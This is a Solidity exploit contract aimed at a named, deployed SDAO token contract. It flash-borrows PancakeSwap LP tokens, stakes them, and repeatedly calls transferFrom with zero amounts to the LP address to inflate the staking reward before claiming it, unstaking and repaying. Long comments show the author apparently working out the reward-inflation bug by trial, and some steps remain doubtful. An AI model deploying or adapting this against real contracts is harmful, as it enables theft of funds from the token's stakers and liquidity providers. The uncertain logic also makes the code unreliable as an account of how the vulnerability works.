interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function transfer(address, uint256) external returns (bool);
    function approve(address, uint256) external returns (bool);
    function transferFrom(address, address, uint256) external returns (bool);
}

interface ISDAO is IERC20 {
    function stakeLP(uint256) external;
    function getReward() external;
    function unStakeLP(uint256) external;
    function LPInstance() external view returns (address);
}

interface IPancakePair {
    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;
    function token0() external view returns (address);
    function token1() external view returns (address);
}

contract Strategy {
    ISDAO target = ISDAO(0x6666625Ab26131B490E7015333F97306F05Bf816);
    IERC20 lp;

    function run() public {
        lp = IERC20(target.LPInstance());

        // 1. Flash loan LP tokens from PancakeSwap pair
        // The LP token itself is a PancakePair (SDAO/USDT)
        IPancakePair(address(lp)).swap(0, lp.balanceOf(address(lp)) - 1, address(this), "0x1234");
    }

    function pancakeCall(address sender, uint amount0, uint amount1, bytes calldata data) external {
        uint256 lpAmount = amount1 > 0 ? amount1 : amount0;

        // 2. Stake LP
        lp.approve(address(target), lpAmount);
        target.stakeLP(lpAmount);

        // 3. Trigger reward inflation
        // In transferFrom: if to == LPInstance, totalStakeReward += amount * 7 / 100
        // We need some SDAO tokens to transfer. Let's see if we can get some.
        // Actually, we can just transfer 0 or a small amount if we have it.
        // But wait, the contract has a lot of SDAO.

        // Let's try to transfer SDAO to the LP contract to trigger the reward logic.
        // We don't have SDAO yet. But we can buy some or check if we can get it.
        // Alternatively, use the LP contract to transfer SDAO to itself? 
        // No, we need to be the caller of transferFrom or transfer.

        // Let's check if we can just call transferFrom(LP, LP, amount)
        // The LP contract likely hasn't approved us.

        // Wait! The vulnerability is in `transfer`:
        // if ( owner == address(LPInstance) ... ) { totalStakeReward += amount * 7 / 100; ... }
        // This triggers when the LP contract is the MSG.SENDER.
        // How can we make the LP contract call transfer?
        // If we swap on the LP contract, it might call transfer? No.

        // Let's look at `transferFrom` again:
        // if ( to == address(LPInstance) ... ) { totalStakeReward += amount * 7 / 100; ... }
        // This triggers when ANYONE transfers SDAO to the LPInstance.
        // We need SDAO. We can get SDAO by swapping some USDT (from the flash loan) for SDAO.

        // But wait, the LP token IS the SDAO/USDT pair.
        // We can just remove liquidity or swap.

        // Let's try a simpler way: if we have 0 SDAO, can we still trigger it?
        // `amount` is the input. If we transfer 1 wei of SDAO to LPInstance many times.
        // But we need 1 wei of SDAO.

        // Let's check our SDAO balance. 0.
        // Let's check if we can buy some SDAO with the borrowed LP? No, LP is not USDT.
        // We can't easily get SDAO without USDT.

        // Wait, the `ido` function!
        // We can use USDT to buy SDAO.
        // Can we flashloan USDT?

        // Let's try to just use the LP tokens we have.
        // If we transfer LP tokens to the target? No, that's not it.

        // Let's look at the code again.
        // `totalStakeReward` is increased in `transfer` if `owner == LPInstance`.
        // `totalStakeReward` is increased in `transferFrom` if `to == LPInstance`.

        // If we call `target.transferFrom(address(target), address(lp), 0)`, 
        // it might work if allowance is enough.

        for(uint i=0; i<10; i++) {
            target.transferFrom(address(target), address(lp), 0);
        }

        target.getReward();
        target.unStakeLP(lpAmount);
        lp.transfer(address(lp), lpAmount * 1001 / 1000); // Repay flash loan
    }
}
